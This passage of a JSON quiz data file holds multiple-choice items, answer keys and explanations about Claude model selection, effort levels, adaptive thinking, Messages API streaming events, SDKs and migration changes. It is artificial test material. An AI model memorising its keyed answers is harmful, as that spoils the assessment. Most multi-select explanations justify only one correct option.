the following models cannot handle that context size on its own?","o":["Claude Opus 4.8, which supports up to a 1M token context window","Claude Sonnet 5, which supports up to a 1M token context window","Claude Fable 5, which supports up to a 1M token context window","Claude Haiku 4.5, which supports up to a 200k token context window"],"a":[3],"m":false,"x":"Claude Haiku 4.5 supports a 200k token context window, which is smaller than the roughly 700,000 tokens this single request would require."},{"d":"model","diff":3,"q":"A developer prototyping an email-classification prompt gives Claude exactly one labeled example before asking it to classify a new email. This approach is best described as which prompting technique?","o":["Zero-shot prompting, since Claude relies entirely on the instructions without any examples","Single-shot prompting, since exactly one example is provided to demonstrate the task","Multi-shot prompting, since any nonzero example count qualifies as multi-shot by definition","Chain-of-thought prompting, since the example demonstrates step-by-step reasoning"],"a":[1],"m":false,"x":"Providing exactly one example to demonstrate the task before asking Claude to perform it on new input is the definition of single-shot, or one-shot, prompting."},{"d":"model","diff":3,"q":"A prompt gives Claude no examples at all, only the instruction \"Summarize the following support ticket in one sentence.\" This approach is best classified as:","o":["Zero-shot prompting, since no examples are given and Claude relies solely on the instruction","Single-shot prompting, since the one instruction sentence itself counts as an example","Multi-shot prompting, since the instruction implicitly contains several examples of tickets","Adaptive prompting, since Claude decides internally how many examples it needs"],"a":[0],"m":false,"x":"With no demonstrations provided at all, this matches zero-shot prompting, where Claude performs the task from instructions alone."},{"d":"model","diff":3,"q":"A real-time trading-desk assistant is built on Claude Opus 4.7 and needs faster output at a premium cost, without switching to a smaller model. Which feature should the team enable?","o":["Fast mode, a research preview available on Opus 4.7 and 4.8 that delivers up to 2.5x higher output speed at premium pricing","Effort set to low, which is the documented way to reduce latency on Opus 4.7 for this exact scenario","Adaptive thinking with display set to omitted, which reduces latency by hiding reasoning tokens entirely","Batch processing, which processes requests asynchronously at a 50 percent cost discount"],"a":[0],"m":false,"x":"Fast mode on Claude Opus 4.7 and 4.8 is a research preview that delivers up to 2.5x higher output speed at premium pricing, matching the team's stated need."},{"d":"model","diff":3,"q":"Which of the following models support the xhigh effort level? (Select all that apply)","o":["Claude Fable 5","Claude Opus 4.8","Claude Sonnet 5","Claude Haiku 4.5","Claude Opus 4.6","Claude Opus 4.7"],"a":[0,1,2,5],"m":true,"x":"Xhigh effort is available on Claude Fable 5, making it one of the models that support this level."},{"d":"model","diff":3,"q":"Which of the following statements correctly describe how adaptive thinking behaves? (Select all that apply)","o":["It lets Claude dynamically decide whether and how much to think based on the complexity of each request","It automatically enables interleaved thinking, allowing Claude to reason between tool calls","It requires manually specifying a budget_tokens value on every request in order to function","At low effort, Claude may skip thinking entirely for simple queries","It is only available on models released before Claude Opus 4.6"],"a":[0,1,3],"m":true,"x":"Adaptive thinking evaluates the complexity of each request and determines whether and how much to use extended thinking, rather than following a fixed manual budget."},{"d":"model","diff":3,"q":"A team is deciding whether Claude Haiku 4.5 is a reasonable starting point for a new, cost-sensitive real-time application. Which of the following are valid reasons to start with Haiku 4.5 rather than Opus 4.8? (Select all that apply)","o":["It offers near-frontier intelligence at the most economical price point among current models","It is well suited to real-time applications and high-volume processing because of its speed","It has a larger context window than Opus 4.8, making it better suited for very long documents","It supports extended thinking, giving it strong reasoning ability at its price point","It is the only current model capable of vision and multilingual input"],"a":[0,1,3],"m":true,"x":"Haiku 4.5 is described as the fastest model with near-frontier intelligence at the most economical price point, a valid reason to start there for cost-sensitive work."},{"d":"model","diff":3,"q":"A frontend engineer building a custom SSE parser for streaming Messages API responses needs to know when it is safe to treat one content block as fully received and move on to parsing the next one. Which event signals that a specific content block, identified by its index, will receive no further delta events?","o":["content_block_stop","message_delta","content_block_start","message_stop"],"a":[0],"m":false,"x":"Correct — content_block_stop is emitted once a content block at a given index has received all of its delta events and will not change further."},{"d":"model","diff":3,"q":"An engineering team maintains a custom SSE event handler for the Messages API. After an Anthropic API update, their handler throws an unhandled exception whenever it encounters an event type it does not recognize, causing the entire stream connection to be dropped. According to Anthropic's guidance on the event stream, what should the handler do instead?","o":["Treat unrecognized event types as expected and skip them without failing, since new event types may be introduced over time under the API's versioning policy.","Immediately close the connection and fall back to a non-streaming request whenever an unfamiliar event type is received, to avoid processing malformed data.","Reject the stream and request a lower anthropic-version header value on subsequent calls, since new event types indicate the client is using too new a version.","Buffer all unrecognized events until message_stop is received, then discard the entire response if any unrecognized events were present."],"a":[0],"m":false,"x":"Correct — Anthropic's versioning policy states new event types may be added, and client code should handle unknown event types gracefully rather than failing."},{"d":"model","diff":3,"q":"A team monitoring their Claude API streaming integration notices periodic ping events interspersed with content_block_delta events in their SSE logs, with no impact on the assembled message content. What is the correct handling for these events?","o":["Treat ping events as keep-alive signals with no data payload relevant to the message content, and simply ignore them when reconstructing the response.","Treat ping events as an early warning that the connection is about to be closed by the server, and preemptively reconnect using the same request.","Treat ping events as partial usage updates and add their token counts to the cumulative usage reported in message_delta.","Treat ping events as a signal that a content block has stalled, and resend the original request if more than one ping event is observed."],"a":[0],"m":false,"x":"Correct — ping events are simply keep-alive markers within the SSE stream and do not carry content or usage data that needs to be merged into the message."},{"d":"model","diff":3,"q":"During a period of high API traffic, a streaming request begins normally with a message_start event, but the stream ends prematurely with an event carrying {\"type\": \"error\", \"error\": {\"type\": \"overloaded_error\", ...}}. What should the client's error-handling logic do in this situation?","o":["Treat this as the streaming equivalent of an HTTP 529 response and apply the same retry-with-backoff logic used for overloaded errors in non-streaming requests.","Treat this as a fatal client-side bug in the SSE parser, since a properly formed stream should never contain an error event once message_start has been received.","Treat this as confirmation that the anthropic-version header is outdated, and update it before retrying the request.","Treat this as a signal that the account has been rate-limited permanently, and stop sending further requests until the API key is rotated."],"a":[0],"m":false,"x":"Correct — the API documents that error events during streaming, such as overloaded_error, correspond to the same condition as an HTTP 529 in a non-streaming context and should be handled the same way, typically with retries."},{"d":"model","diff":3,"q":"A Go service streams Messages API responses and needs to build the complete Message object as events arrive, without implementing manual JSON reconstruction logic for tool inputs and text blocks. Which approach does the official Go SDK provide for this?","o":["Call message.Accumulate(event) inside the stream loop on an anthropic.Message value, which incrementally builds the complete Message as each event is processed.","Call stream.Collect(), which blocks until the connection closes and returns the fully parsed Message without requiring a loop over individual events.","Deserialize each event's raw JSON payload into a generic map and manually append text and tool fragments into a hand-rolled struct.","Call client.Messages.New() with stream set to false immediately after starting the streaming call, which returns the equivalent non-streaming Message object."],"a":[0],"m":false,"x":"Correct — the Go SDK documents calling message.Accumulate(event) for each event in the stream loop to build the same complete Message object returned by a non-streaming call."},{"d":"model","diff":3,"q":"A PHP developer using the official Anthropic PHP SDK wants to stream a Messages API response and process events as they arrive. Which SDK method should be used to obtain the stream?","o":["$client->messages->createStream(...)","$client->messages->stream(...)","$client->messages->streamCreate(...)","$client->messages->openStream(...)"],"a":[0],"m":false,"x":"Correct — the PHP SDK exposes streaming through the createStream() method on the messages resource, as shown in Anthropic's documentation."},{"d":"model","diff":3,"q":"An application streams tool_use content blocks for tools that accept large structured input objects, and the team observes noticeable latency before the full input becomes available because the SDK buffers and validates the JSON before exposing it. Which feature is designed to reduce this latency by streaming tool input parameters without buffering or JSON validation?","o":["Fine-grained tool streaming, enabled per tool with eager_input_streaming","Extended thinking with display set to summarized","Automatic prompt caching on the last cacheable block","Server-side fallback across multiple named models"],"a":[0],"m":false,"x":"Correct — fine-grained tool streaming, enabled per tool via eager_input_streaming, streams tool_use parameter values without buffering or JSON validation, reducing latency for large parameter payloads."},{"d":"model","diff":3,"q":"While streaming a response with extended thinking enabled, a client receives a thinking content block that ends with a signature_delta event immediately before content_block_stop. What is the purpose of this signature_delta event?","o":["It provides a signature used to verify the integrity of the thinking block's content.","It marks the point at which the thinking block's token usage should be added to the cumulative usage total.","It indicates that the thinking block has been redacted for policy compliance and its content should be discarded.","It signals that a fallback model has taken over generation for the remainder of the response."],"a":[0],"m":false,"x":"Correct — the signature_delta event carries a signature used to verify the integrity of the preceding thinking content, sent just before the block closes."},{"d":"model","diff":3,"q":"A production integration using Claude 4.6 experiences a network interruption partway through a streamed response. The team wants to resume generation from where it left off without reprocessing the entire original prompt. Following Anthropic's documented recovery strategy for Claude 4.6 and later models, what should the continuation request contain?","o":["A new user message that includes the partial response received so far along with an instruction for the model to continue from where it left off.","The partial response placed directly as the beginning of a new assistant message, exactly as done for Claude 4.5 and earlier models.","A repeat of the original user message unchanged, relying on the model's session memory to automatically resume the prior generation.","A request with the stream parameter set to false and a reduced max_tokens value, discarding the partial content already received."],"a":[0],"m":false,"x":"Correct — for Claude 4.6 and later, the documented recovery strategy wraps the partial response in a new user message with an instruction to continue, rather than continuing an assistant message."},{"d":"model","diff":3,"q":"A team is documenting the SSE event flow for the Messages API streaming endpoint so that other engineers can build custom parsers. Which of the following statements about the event flow are accurate? (Select all that apply.)","o":["Each stream begins with a message_start event containing a Message object whose content array is empty.","Each content block is bounded by a content_block_start event and a content_block_stop event, with zero or more content_block_delta events in between.","The stream always ends with a message_stop event, which is sent before the final message_delta event so that clients can start finalizing usage totals early.","ping events occur at a fixed interval of exactly one per content block and never appear at any other point in the stream.","A single stream can only contain one content block; content_block_start and content_block_stop therefore each appear exactly once per stream.","message_delta events report top-level changes to the Message object, such as stop_reason, and one or more message_delta events can be sent before the final message_stop event."],"a":[0,1,5],"m":true,"x":"Correct — message_start is the first event and carries a Message object with an empty content array, to be filled in as the stream progresses."},{"d":"model","diff":3,"q":"A staff engineer is evaluating which languages have an official Anthropic client SDK for the Messages API before choosing one for a new service. Which of the following are officially supported client SDK languages according to Anthropic's documentation? (Select all that apply.)","o":["Python","Rust","Go","Swift","Ruby","Kotlin"],"a":[0,2,4],"m":true,"x":"Correct — Python is one of the seven officially supported client SDK languages for the Messages API."},{"d":"model","diff":3,"q":"A reliability engineer is writing a runbook for handling interrupted streaming connections to the Messages API. Which of the following are accurate error-recovery practices or facts documented by Anthropic? (Select all that apply.)","o":["Save all content that was successfully received before the interruption so it can be used to construct the continuation request.","Rely on the SDK's built-in message accumulation and error-handling capabilities rather than re-implementing accumulation logic from scratch.","Tool_use and extended thinking content blocks can be partially recovered by resubmitting only the missing bytes of the interrupted block.","Resuming is only reliable from the most recent text block, since tool_use and extended thinking blocks cannot be partially recovered.","Discard any partial response content immediately, since the Messages API guarantees automatic server-side resumption of interrupted streams without client involvement.","Extended thinking blocks that were fully streamed before the interruption must be re-fetched from a separate thinking export endpoint before they can be reused in the continuation request."],"a":[0,1,3],"m":true,"x":"Correct — capturing everything received before the error is the documented first step of the recovery strategy."},{"d":"model","diff":3,"q":"A developer is building a generic SSE event handler that must branch on the delta type field inside content_block_delta events to correctly process every kind of streamed content. Which of the following are valid delta types documented for content_block_delta events? (Select all that apply.)","o":["text_delta","input_json_delta","tool_result_delta","thinking_delta","usage_delta","content_delta"],"a":[0,1,3],"m":true,"x":"Correct — text_delta carries incremental text content for text content blocks."},{"d":"model","diff":3,"q":"A team is building a real-time customer support chat widget that must respond in under a second, at high volume, on a tight budget, but still needs solid reasoning quality. Which model should they start with?","o":["Claude Haiku 4.5, for near-frontier reasoning at the fastest, most economical tier","Claude Opus 4.8, for the deepest reasoning on complex agentic coding tasks","Claude Sonnet 5, for frontier intelligence at a moderate cost and speed","Claude Fable 5, for the largest context window and always-on adaptive thinking"],"a":[0],"m":false,"x":"Correct. Claude Haiku 4.5 is positioned as the fastest, most economical model with near-frontier intelligence, matching real-time, high-volume, cost-sensitive chat requirements."},{"d":"model","diff":3,"q":"An engineering org wants to run an autonomous coding agent that will work independently for several hours making large-scale refactors across a big enterprise codebase. Which combination of model and effort setting best fits this workload?","o":["Claude Opus 4.8 with effort set to xhigh, for maximum reasoning depth on long-running agentic coding","Claude Sonnet 5 with effort set to low, for fast iteration on simple code edits","Claude Haiku 4.5 with extended thinking disabled, for the lowest possible cost per call","Claude Opus 4.8 with sampling temperature raised, for more creative refactoring suggestions"],"a":[0],"m":false,"x":"Correct. Opus 4.8 is recommended for multi-hour autonomous coding agents and large-scale refactoring, and xhigh is documented as the best effort setting for most coding and agentic use cases."},{"d":"model","diff":3,"q":"A team upgrades an integration from claude-opus-4-6 to claude-opus-4-8 without changing any code. Their existing calls set thinking: {type: \"enabled\", budget_tokens: 10000} and now fail with a 400 error. What is the correct fix?","o":["Replace the thinking block with {type: \"adaptive\"} and set effort via output_config","Keep budget_tokens but wrap it inside a new manual_thinking object","Remove the thinking field entirely and rely on Opus 4.8's fixed reasoning depth","Downgrade back to claude-opus-4-6 since Opus 4.8 no longer supports reasoning"],"a":[0],"m":false,"x":"Correct. Opus 4.8 only supports adaptive thinking; manual {type: \"enabled\", budget_tokens} is rejected, so requests must switch to {type: \"adaptive\"} and use the effort parameter to guide reasoning depth."},{"d":"model","diff":3,"q":"After migrating from Opus 4.6 to Opus 4.8, an application starts hitting stop_reason: \"max_tokens\" more often on prompts that previously completed normally, even though the prompt text itself is unchanged. What is the most likely cause and correct remedy?","o":["Opus 4.8 uses a new tokenizer that produces roughly 30% more tokens for the same text, so max_tokens should be raised","Opus 4.8 has a smaller output token ceiling than Opus 4.6, so requests must be split into smaller chunks","Opus 4.8 charges for thinking tokens twice, so the billed max_tokens budget is effectively halved","Opus 4.8 requires a beta header to unlock the full 128k output limit, which was omitted"],"a":[0],"m":false,"x":"Correct. Opus 4.8 uses the tokenizer introduced with Opus 4.7, which produces roughly 30% more tokens for the same content, so max_tokens and cost expectations need to be re-baselined."},{"d":"model","diff":3,"q":"An application that previously ran on claude-sonnet-4-6 with temperature: 0.2 for more deterministic outputs is migrated to claude-sonnet-5 and now every request fails with a 400 error. What must the team do?","o":["Remove the temperature parameter entirely and use prompting to guide output consistency","Lower the temperature value further, since only values above 0.5 are rejected","Move the temperature setting into the thinking configuration block instead of the request root","Add the interleaved-thinking beta header, which re-enables sampling parameter overrides"],"a":[0],"m":false,"x":"Correct. Claude Sonnet 5 rejects any non-default temperature, top_p, or top_k value with a 400 error, so the parameter must be removed and consistency achieved through prompting instead."},{"d":"model","diff":3,"q":"A team running production traffic on Claude Opus 4.8 with effort set to xhigh finds that costs are higher than budgeted, but they still want to keep using Opus 4.8 rather than switch models. What is the most direct lever to reduce cost and latency without changing models?","o":["Lower the effort parameter to medium or high, trading some intelligence for lower cost and latency","Enable prompt caching only, since effort has no measurable effect on cost","Disable adaptive thinking entirely, which is required before effort can be changed","Switch to manual thinking with a small budget_tokens value, since Opus 4.8 still accepts it"],"a":[0],"m":false,"x":"Correct. Tuning the effort parameter is documented as often a better lever than switching models, letting a team trade intelligence for lower cost and latency within the same model."},{"d":"model","diff":3,"q":"An enterprise team building coding and agentic tooling at scale wants frontier-level intelligence but needs a favorable balance of speed and cost compared to Opus-tier pricing. Which model should they choose first?","o":["Claude Sonnet 5, for frontier intelligence at scale with faster, less expensive responses than Opus","Claude Opus 4.8, for the highest capability at moderate speed and higher pricing","Claude Haiku 4.5, for the lowest cost but reduced complex-reasoning capability","Claude Opus 4.1, for legacy compatibility with older enterprise integrations"],"a":[0],"m":false,"x":"Correct. Sonnet 5 is described as frontier intelligence at scale built for coding, agents, and enterprise workflows, with faster comparative latency and lower pricing than Opus 4.8."},{"d":"model","diff":3,"q":"A team is building a long-running autonomous agent that must operate over extremely large codebases and documents, needs a 1M-token context window as standard, and benefits from thinking that is always active without configuration. Which model fits this description?","o":["Claude Fable 5, which provides a 1M-token context window by default and always-on adaptive thinking","Claude Opus 4.8, which provides a 1M-token context window with adaptive thinking on by default","Claude Sonnet 5, which provides always-on adaptive thinking but only a 200k-token context window","Claude Haiku 4.5, which provides the largest context window among current models"],"a":[0],"m":false,"x":"Correct. Claude Fable 5 is described as next-generation intelligence for long-running agents, with a 1M-token context window by default and adaptive thinking that is always on."},{"d":"model","diff":3,"q":"A developer is auditing which current and legacy Claude models support adaptive thinking before standardizing their fleet's thinking configuration. Based on official guidance, which of the following models support adaptive thinking?","o":["Claude Opus 4.8","Claude Sonnet 5","Claude Haiku 4.5","Claude Opus 4.1","Claude Fable 5","Claude Sonnet 4.5"],"a":[0,1,4],"m":true,"x":"Correct. Claude Opus 4.8 supports adaptive thinking as its only thinking mode, though it must be explicitly requested."},{"d":"model","diff":3,"q":"A team migrating existing code from claude-sonnet-4-6 (using thinking: {type: \"enabled\", budget_tokens: N}) to claude-sonnet-5 needs to identify which behavior changes will affect them. Which of the following are accurate about this migration?","o":["Manual budget_tokens now returns a 400 error and must be replaced with adaptive thinking","Adaptive thinking is on by default, so an omitted thinking field no longer disables it","The new tokenizer produces about the same token counts as Sonnet 4.6 did","Non-default temperature, top_p, and top_k values now return a 400 error","Assistant message prefilling becomes supported for the first time on Sonnet 5","Prompt caching becomes fully disabled whenever adaptive thinking is active"],"a":[0,1,3],"m":true,"x":"Correct. Sonnet 5 rejects manual thinking.type: \"enabled\" with a 400 error, so calls must move to thinking: {type: \"adaptive\"}."},{"d":"model","diff":3,"q":"An engineering lead is evaluating whether upgrading from claude-opus-4-7 to claude-opus-4-8 will require code changes, separate from the changes already made for the 4.6-to-4.7 transition. Which of the following statements about the Opus 4.7 to Opus 4.8 migration are accurate?","o":["There are no breaking API changes when moving from Opus 4.7 to Opus 4.8","The effort parameter defaults to high, so a tuned xhigh setting should be re-checked","The 1M-token context window becomes default without needing a beta header","Extended thinking with budget_tokens becomes available again on Opus 4.8","Temperature and top_p become configurable again after being restricted on Opus 4.7","Adaptive thinking becomes the only supported mode for the first time on Opus 4.8"],"a":[0,1,2],"m":true,"x":"Correct. Code running on Opus 4.7 continues to work unchanged on Opus 4.8; there are no breaking API changes between these two releases."},{"d":"model","diff":3,"q":"A platform team is designing thinking-mode configuration guidelines for their applications. Which of the following statements about adaptive, manual, and disabled thinking modes are accurate?","o":["Switching between adaptive and enabled/disabled modes breaks message cache breakpoints","On Opus 4.8, manual thinking with type enabled is rejected with a 400 error","Disabled thinking is available on every current model, including Claude Fable 5","Adaptive thinking automatically enables interleaved thinking between tool calls","The effort parameter has no influence on how much Claude thinks under adaptive mode","System prompts and tool definitions lose cache status whenever thinking mode changes"],"a":[0,1,3],"m":true,"x":"Correct. Switching a conversation between adaptive thinking and enabled/disabled thinking breaks prompt cache breakpoints for messages."},{"d":"model","diff":3,"q":"A team is building a workflow that combines heavy computer-use screen interactions, vision-based UI understanding, and complex multi-step task execution where accuracy matters more than cost. Which model best fits the model-selection matrix guidance for this workload?","o":["Claude Opus 4.8, recommended for vision-heavy workflows and computer use requiring the highest capability","Claude Sonnet 5, recommended primarily for high-volume real-time chat rather than computer use","Claude Haiku 4.5, recommended when cost sensitivity outweighs the need for complex reasoning","Claude Opus 4.1, recommended as the current flagship for enterprise vision tasks"],"a":[0],"m":false,"x":"Correct. The model-selection matrix lists vision-heavy workflows and computer use alongside complex agentic coding and enterprise work as the use cases pointing to Claude Opus 4.8."},{"d":"model","diff":3,"q":"A team's existing integration relies on assistant message prefilling to force JSON-formatted output, seeding the assistant turn with an opening brace. After moving this workload onto a current Claude 4-generation model, requests begin failing. What should they do instead?","o":["Use structured outputs or the output_config format option to enforce the JSON shape instead of prefilling","Prefill with a shorter string, since prefilling still works below a certain character limit","Move the prefill content into the system prompt, where prefilling restrictions do not apply","Enable manual thinking mode, which restores support for assistant message prefilling"],"a":[0],"m":false,"x":"Correct. Assistant message prefilling is unsupported on current Claude 4-generation models, so structured outputs or the output_config format option should be used to enforce the desired JSON shape instead."},{"d":"model","diff":3,"q":"A team still running a customer-facing feature on claude-opus-4-1-20250805 learns it is deprecated and scheduled for retirement. They want to plan a low-risk migration path. Which statement reflects the correct guidance?","o":["Migrate to Claude Opus 4.8 before the retirement date, since Opus 4.1 will be retired on August 5, 2026","No migration is needed, since deprecated models remain fully supported indefinitely on Claude Platform on AWS","Migrate to Claude Haiku 4.5 specifically, since only Haiku models can serve as replacements for deprecated Opus models","Wait until after the retirement date to migrate, since deprecated models continue serving traffic for a grace period afterward"],"a":[0],"m":false,"x":"Correct. Claude Opus 4.1 is deprecated and set to retire on August 5, 2026; official guidance is to migrate to Claude Opus 4.8 before that date."},{"d":"model","diff":3,"q":"A coding agent team on Claude Opus 4.8 wants the best setting for autonomous, high-stakes engineering work where intelligence matters far more than response speed, and they are told the default effort level may be insufficient for this specific use case. What should they set?","o":["Set effort to xhigh, described as the best setting for most coding and agentic use cases on Opus 4.8","Set effort to medium, since Opus 4.8 defaults to a lower setting that undershoots the required intelligence","Set effort to low, since low effort forces the model to always think regardless of task complexity","Leave effort unset, since Opus 4.8 does not expose an effort parameter"],"a":[0],"m":false,"x":"Correct. On Claude Opus 4.8, xhigh is documented as the best effort setting for most coding and agentic use cases, above the default high level, matching this high-stakes engineering scenario."},{"d":"model","diff":3,"q":"A product team is deciding between prototyping quickly with a fast, inexpensive model versus starting with the most capable model for a new feature that involves ambiguous, high-stakes scientific calculations. Which starting approach matches Anthropic's documented guidance for this kind of task?","o":["Start with Claude Opus 4.8, since scientific and mathematical applications favor beginning with the most capable model","Start with Claude Haiku 4.5, since all new features should begin with the fastest and cheapest model regardless of task","Start with Claude Sonnet 5, since only Sonnet models are recommended as a starting point for any prototype","Start with Claude Fable 5, since Anthropic recommends the most capable model as the default first choice for every application"],"a":[0],"m":false,"x":"Correct. Anthropic's guidance for complex reasoning, scientific, or mathematical applications is to start with the most capable model, implementing with Claude Opus 4.8 and optimizing from there."},{"d":"prompt","diff":3,"q":"Before a long session compacts, a team wants to archive the full, unsummarized transcript for audit purposes. Which mechanism should they use?","o":["A PreCompact hook, which runs custom logic before compaction occurs and can write the full transcript somewhere before the summary replaces it","A PostToolUse hook, which fires after each tool call completes and stores a running copy of every tool result for later review","The compact_boundary system message payload, which already contains the full pre-compaction transcript embedded as a field","A SessionEnd hook, since compaction only ever happens once the session has fully ended and the transcript is finalized"],"a":[0],"m":false,"x":"Correct. PreCompact is a hook that runs custom logic before compaction occurs, which is the documented way to archive the full transcript ahead of summarization, and it receives a trigger field (manual or auto)."},{"d":"prompt","diff":3,"q":"An engineer is building a research agent that needs to read dozens of files across a large repository to answer one question, without letting all that file content pile up in the main conversation's context. Which design best achieves this?","o":["Delegate the file exploration to a subagent, whose fresh context absorbs all the intermediate reads while only its final summary message returns to the parent","Read every file directly in the main agent loop, then issue a manual /compact command immediately afterward to shrink the accumulated history","Read every file directly in the main agent loop, but set effort to low so the extra file content consumes fewer tokens per turn","Store all file contents in a custom MCP resource and have the main agent fetch a single combined resource URI instead of individual files"],"a":[0],"m":false,"x":"Correct. A subagent runs in its own fresh conversation; intermediate tool calls and results stay inside the subagent, and only its final message returns to the parent, so the main context grows by a summary rather than every file read."},{"d":"prompt","diff":3,"q":"A code review workflow runs a style-checker subagent, a security-scanner subagent, and a test-coverage subagent for the same pull request. The tea
